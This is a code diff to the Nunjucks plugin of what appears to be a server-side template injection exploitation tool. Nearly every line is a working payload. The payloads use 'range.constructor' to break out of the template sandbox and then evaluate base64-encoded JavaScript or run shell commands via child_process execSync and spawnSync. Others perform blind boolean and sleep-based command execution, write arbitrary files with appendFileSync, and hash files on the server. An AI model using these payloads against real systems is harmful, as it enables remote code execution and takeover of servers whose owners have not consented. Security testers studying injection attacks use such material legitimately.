@@ -33,6 +33,33 @@ class Nunjucks(javascript.Javascript):
                 'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'evaluate': {
+                'call': 'render',
+                'evaluate': """{{{{range.constructor("return eval(Buffer('{code_b64p}','base64').toString())")()}}}}""",
+                'test_os': """global.process.mainModule.require('os').platform()""",
+                'test_os_expected': r'^[\w-]+$',
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}','base64').toString())""",
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """{{{{range.constructor("return [''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']")()}}}}"""
+            },
+            'execute': {
+                'call': 'evaluate',
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
+            'execute_blind': {
+                'call': 'inject',
+                'execute_blind': """{{{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')")()}}}}"""
+            },
             'write': {
                 'call': 'inject',
                 'write': """{{{{range.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')")()}}}}""",
@@ -45,23 +72,6 @@ class Nunjucks(javascript.Javascript):
             'md5': {
                 'call': 'evaluate',
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
-            },
-            'evaluate': {
-                'call': 'render',
-                'evaluate': """{{{{range.constructor("return eval(Buffer('{code_b64p}','base64').toString())")()}}}}""",
-                'test_os': """global.process.mainModule.require('os').platform()""",
-                'test_os_expected': r'^[\w-]+$',
-            },
-            'evaluate_error': {
-                'evaluate': """eval(Buffer('{code_b64p}','base64').toString())""",
-            },
-            'execute': {
-                'call': 'evaluate',
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
-            },
-            'execute_blind': {
-                'call': 'inject',
-                'execute_blind': """{{{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')")()}}}}"""
             },
         })
 
